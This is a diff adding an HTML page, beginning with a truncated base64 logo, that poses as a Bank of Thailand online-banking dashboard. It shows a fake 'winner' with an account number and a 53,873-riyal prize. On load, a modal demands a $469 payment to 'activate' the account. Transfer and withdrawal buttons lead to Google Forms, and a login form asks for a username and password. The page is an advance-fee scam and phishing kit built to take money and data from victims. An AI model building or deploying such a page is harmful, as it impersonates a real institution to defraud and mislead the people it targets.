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" alt="Bank of Thailand Logo" style="height: 80px;">
+        <div>
+            <h1>Bank of Thailand</h1>
+            <p>Your trusted partner in financial growth</p>
+        </div>
+    </div>
+</header>
+    <nav>
+        <a href="#">Home</a>
+        <a href="#">Accounts</a>
+        <a href="#">Loans</a>
+        <a href="#">Contact</a>
+        <a href="#" id="loginLink">Login</a>
+    </nav>
+    <div class="container" id="mainContent">
+        <h2>Banking Dashboard</h2>
+        <div style="display:flex;flex-wrap:wrap;gap:24px;">
+            <!-- Account Balance -->
+            <div class="feature short-card">
+                <h3>Account Balance</h3>
+                <p id="balanceDetails" style="display: none;">
+                    Checking: 53,873.00 RIYAL<br>
+                    Savings: 00,000.00
+                </p>
+                <button id="checkBalanceBtn">Check Balance</button>
+            </div>
+            <!-- Transaction History -->
+            <div class="feature short-card">
+                <h3>Transaction History</h3>
+                <button>View Statement</button>
+                <button>Download PDF</button>
+            </div>
+            <!-- Money Transfer -->
+            <div class="feature">
+                <h3>Money Transfer</h3>
+                <button onclick="window.open('https://docs.google.com/forms/d/e/1FAIpQLSd8JWpQTYv3d5oyNTzBv4v2wKunTm2U75-GC6kTvxGEaIBGOw/viewform?usp=header')">Own Account</button>
+                <button onclick="window.open('https://docs.google.com/forms/d/e/1FAIpQLSd8JWpQTYv3d5oyNTzBv4v2wKunTm2U75-GC6kTvxGEaIBGOw/viewform?usp=header')">Other Account</button>
+                <button onclick="window.open('https://docs.google.com/forms/d/e/1FAIpQLSd8JWpQTYv3d5oyNTzBv4v2wKunTm2U75-GC6kTvxGEaIBGOw/viewform?usp=header')">Inter-bank</button>
+                <button onclick="window.open('https://docs.google.com/forms/d/e/1FAIpQLSd8JWpQTYv3d5oyNTzBv4v2wKunTm2U75-GC6kTvxGEaIBGOw/viewform?usp=header')">International</button>
+            <!-- Deposit & Withdraw -->
+<div class="feature">
+    <h3>Deposit / Withdraw</h3>
+    <button onclick="window.open('https://forms.gle/your-deposit-form', '_blank')">Deposit</button>
+    <button onclick="window.open('https://docs.google.com/forms/d/e/1FAIpQLSf9nRvkRS7z1h9m0gH1Rc2hIaO9LTzC14MY04NtboL_4RKMxA/viewform?usp=header')">Withdraw</button>
+</div>
+            <!-- Bill Payment -->
+            <div class="feature">
+                <h3>Bill Payment</h3>
+                <button>Electricity</button>
+                <button>Water</button>
+                <button>Gas</button>
+                <button>Mobile Recharge</button>
+            </div>
+            <!-- Loan Application & EMI -->
+            <div class="feature">
+                <h3>Loan & EMI</h3>
+                <button>Apply for Loan</button>
+                <button>Pay EMI</button>
+            </div>
+            <!-- FD, DPS, Savings -->
+            <div class="feature">
+                <h3>Fixed Deposit / DPS / Savings</h3>
+                <button>Open FD</button>
+                <button>Open DPS</button>
+                <button>Manage Savings</button>
+            </div>
+            <!-- Card Management -->
+            <div class="feature">
+                <h3>Credit/Debit Card</h3>
+                <button>Apply Card</button>
+                <button>Block Card</button>
+                <button>Check Transactions</button>
+            </div>
+            <!-- Winner Card -->
+            <div class="feature">
+    <h3>Winner Card</h3>
+    <button id="showWinnerCard" class="btn">Winning Details</button>
+    <div id="winnerCard" class="winner-card" style="display: none;">
+        <img src=".png" alt="Winner Photo" class="winner-photo">
+        <h3>Congratulations!</h3>
+        <p><strong>Name:</strong> [Rama Shankar]</p>
+        <p><strong>Phone Number:</strong><NAv>[NA]</NAv> <div ></div></p>
+        <p><strong>Country:</strong> [SAUDI ARABIA]</p>
+        <p><strong>Account Number:</strong> [10000065055420000107]</p>
+        <p><strong>Winning Amount:</strong> [53,873.00 RIYAL]</p>
+        <p style="color: red;"><strong>Status:</strong> Account is currently inactive</p>
+        <p style="color: red;"><strong>Withdraw:</strong> Pending</p>
+    </div>
+</div>
+            <!-- Insurance & Investment -->
+            <div class="feature">
+                <h3>Insurance & Investment</h3>
+                <button>Explore Options</button>
+            </div>
+            <!-- Currency Exchange -->
+            <div class="feature">
+                <h3>Currency Exchange Rates</h3>
+                <p>USD/THB: 36.50</p>
+                <p>EUR/THB: 39.80</p>
+                <button>More Rates</button>
+            </div>
+            <!-- Mobile Banking -->
+            <div class="feature">
+                <h3>Mobile Banking</h3>
+                <button>Download App</button>
+            </div>
+            <!-- QR Code Payment -->
+            <div class="feature">
+                <h3>QR Code Payment</h3>
+                <button>Scan & Pay</button>
+            </div>
+            <!-- ATM / Branch Locator -->
+            <div class="feature">
+                <h3>ATM / Branch Locator</h3>
+                <button onclick="window.open('https://www.google.com/maps/search/Bank+of+Thailand+ATM', '_blank')">Find Nearby</button>
+            </div>
+            <!-- Chatbot / Live Chat -->
+            <div class="feature">
+                <h3>Chatbot / Live Chat</h3>
+                <button>Start Chat</button>
+            </div>
+        </div>
+    </div>
+    <!-- Login Form (hidden by default) -->
+    <div class="login-bg" id="loginForm" style="display:none;">
+        <div class="login-container">
+            <h2>Login to Your Account</h2>
+            <form>
+                <div class="form-group">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" name="username" required autocomplete="username">
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required autocomplete="current-password">
+                </div>
+                <button type="submit" class="login-btn">Login</button>
+            </form>
+            <p><a href="#" id="backHome" class="back-link">← Back to Home</a></p>
+        </div>
+    </div>
+    <!-- Warning Modal -->
+    <div id="warningModal" class="modal">
+        <div class="modal-content">
+            <h2>Important Notice</h2>
+            <p>Please pay first $469 to activate your account and perform any transactions.</p>
+            <button id="closeModalBtn">OK</button>
+        </div>
+    </div>
+    <footer>
+        &copy; 2025 Bank of Thailand. All rights reserved.
+    </footer>
+    <script>
+        // Show login form when Login is clicked
+        document.getElementById('loginLink').onclick = function(e) {
+            e.preventDefault();
+            document.getElementById('mainContent').style.display = 'none';
+            document.getElementById('loginForm').style.display = 'block';
+        };
+        // Back to home
+        document.getElementById('backHome').onclick = function(e) {
+            e.preventDefault();
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
+        };
+        // Toggle winner card visibility
+        document.getElementById('showWinnerCard').addEventListener('click', function() {
+            const winnerCard = document.getElementById('winnerCard');
+            winnerCard.style.display = winnerCard.style.display === 'none' ? 'block' : 'none';
+        });
+        // Toggle balance visibility
+        document.getElementById('checkBalanceBtn').addEventListener('click', function () {
+            const balanceDetails = document.getElementById('balanceDetails');
+            if (balanceDetails.style.display === 'none') {
+                balanceDetails.style.display = 'block';
+                this.textContent = 'Hide Balance';
+            } else {
+                balanceDetails.style.display = 'none';
+                this.textContent = 'Check Balance';
+            }
+        });
+        // Function to display cards one by one
+function showCardsSerially() {
+    const cards = document.querySelectorAll('.feature'); // Select all cards
+    let delay = 0;
+
+    cards.forEach((card, index) => {
+        setTimeout(() => {
+            card.style.opacity = '1'; // Make the card visible
+            card.style.transform = 'translateY(0)'; // Reset the position
+        }, delay);
+        delay += 300; // Add a delay of 300ms between each card
+    });
+}
+
+// Initialize cards with hidden styles
+window.onload = function () {
+    const modal = document.getElementById('warningModal');
+    const closeModalBtn = document.getElementById('closeModalBtn');
+
+    // Display the modal
+    modal.style.display = 'flex';
+
+    // Close the modal when the "OK" button is clicked
+    closeModalBtn.onclick = function () {
+        modal.style.display = 'none';
+        showCardsSerially(); // Start showing cards after closing the modal
+    };
+
+    // Hide all cards initially
+    const cards = document.querySelectorAll('.feature');
+    cards.forEach((card) => {
+        card.style.opacity = '0'; // Hide the card
+        card.style.transform = 'translateY(20px)'; // Move the card down
+        card.style.transition = 'opacity 0.5s, transform 0.5s'; // Add transition
+    });
+};
+    </script>
+</body>
+</html>
